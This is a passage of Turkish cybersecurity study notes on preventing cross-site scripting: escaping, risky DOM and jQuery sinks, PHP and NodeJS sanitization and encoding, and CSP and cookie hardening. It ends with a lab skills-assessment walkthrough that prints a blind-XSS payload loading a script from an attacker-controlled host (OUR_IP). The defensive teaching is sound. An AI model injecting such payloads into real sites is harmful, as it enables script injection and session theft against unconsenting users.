Bu, herhangi bir özel karakterden ters eğik çizgi \ ile kaçacaktır; bu, kullanıcının özel karakterler içeren herhangi bir girdi (JavaScript kodu gibi) göndermemesini sağlamaya yardımcı olacaktır, bu da DOM XSS gibi güvenlik açıklarını önleyecektir.


### Direct Input
Son olarak, kullanıcı girdisini hiçbir zaman doğrudan belirli HTML etiketleri içinde kullanmadığımızdan emin olmalıyız:

1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`


Kullanıcı girdisi yukarıdaki örneklerden herhangi birine girerse, kötü amaçlı JavaScript kodu enjekte edebilir ve bu da bir XSS güvenlik açığına yol açabilir. Buna ek olarak, HTML alanlarının ham metnini değiştirmeye izin veren JavaScript işlevlerini kullanmaktan kaçınmalıyız:

- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

Ve aşağıdaki jQuery fonksiyonları:

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

Bu işlevler HTML koduna ham metin yazdığından, herhangi bir kullanıcı girdisi bunlara girerse, kötü amaçlı JavaScript kodu içerebilir ve bu da bir XSS güvenlik açığına yol açar.



## Back-end

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

Bir NodeJS back-end için, daha önce front-end için bahsedilen JavaScript kodunun aynısını kullanabiliriz.


### Girdi Temizleme
Girdi sanitizasyonu söz konusu olduğunda, front-end girdi sanitizasyonu özel GET veya POST istekleri gönderilerek kolayca atlanabileceğinden, back-end hayati bir rol oynar. Neyse ki, çeşitli back-end dilleri için herhangi bir kullanıcı girdisini düzgün bir şekilde sanitize edebilen çok güçlü kütüphaneler vardır, böylece hiçbir enjeksiyonun gerçekleşmemesini sağlarız.

Örneğin, bir PHP back-end için, özel karakterleri ters eğik çizgi ile kaçarak kullanıcı girdisini sterilize etmek için addslashes işlevini kullanabiliriz:

```php
addslashes($_GET['email'])
```

Her durumda, doğrudan kullanıcı girdisi (örneğin $_GET['email']) sayfada asla doğrudan görüntülenmemelidir, çünkü bu XSS güvenlik açıklarına yol açabilir.

NodeJS back-end için, front-end'de yaptığımız gibi DOMPurify kütüphanesini aşağıdaki gibi de kullanabiliriz:

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```


#### Output HTML Encoding

Back-end'de dikkat edilmesi gereken bir diğer önemli husus da Output Encoding'dir. Bu, herhangi bir özel karakteri HTML kodlarına kodlamamız gerektiği anlamına gelir; bu, bir XSS güvenlik açığı oluşturmadan tüm kullanıcı girdisini görüntülememiz gerekiyorsa yararlıdır. Bir PHP back-end'i için, htmlspecialchars veya htmlentities fonksiyonlarını kullanabiliriz, bunlar belirli özel karakterleri HTML kodlarına kodlar (örneğin <'yi &lt'ye), böylece tarayıcı bunları doğru şekilde görüntüler, ancak herhangi bir tür enjeksiyona neden olmazlar:

```php
htmlentities($_GET['email']);
```

Bir NodeJS back-end için, html-entities gibi HTML kodlaması yapan herhangi bir kütüphaneyi aşağıdaki gibi kullanabiliriz:

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```


#### Server Configuration

* Tüm domain genelinde HTTPS kullanma.
* XSS önleme başlıklarını kullanma.
* X-Content-Type-Options=nosniff gibi sayfa için uygun Content-Type kullanımı.
* Yalnızca local olarak barındırılan komut dosyalarına izin veren script-src 'self' gibi Content-Security-Policy seçeneklerini kullanmak.
* JavaScript'in cookie'leri okumasını önlemek ve sadece HTTPS üzerinden aktarmak için HttpOnly ve Secure cookie bayraklarını kullanmak.

Yukarıdakilere ek olarak, iyi bir Web Uygulaması Güvenlik Duvarı'na (WAF) sahip olmak, HTTP isteklerinden geçen her türlü enjeksiyonu otomatik olarak algılayacağından ve bu tür istekleri otomatik olarak reddedeceğinden, XSS istismarı olasılığını önemli ölçüde azaltabilir. Ayrıca, ASP.NET gibi bazı frameworkler yerleşik XSS koruması sağlar.


# Skills Assessment

/assessment dizinine erişin:

![Pasted image 20241117051049.png](/img/user/resimler/Pasted%20image%2020241117051049.png)

![Pasted image 20241117051057.png](/img/user/resimler/Pasted%20image%2020241117051057.png)

Hangi girdi'de bu istek geldi  ?  Url parametresinde kullandığımız payload sonuc verdi . 

"><script src=http://OUR_IP></script>


![Pasted image 20241117051713.png](/img/user/resimler/Pasted%20image%2020241117051713.png)

![Pasted image 20241117051726.png](/img/user/resimler/Pasted%20image%2020241117051726.png)
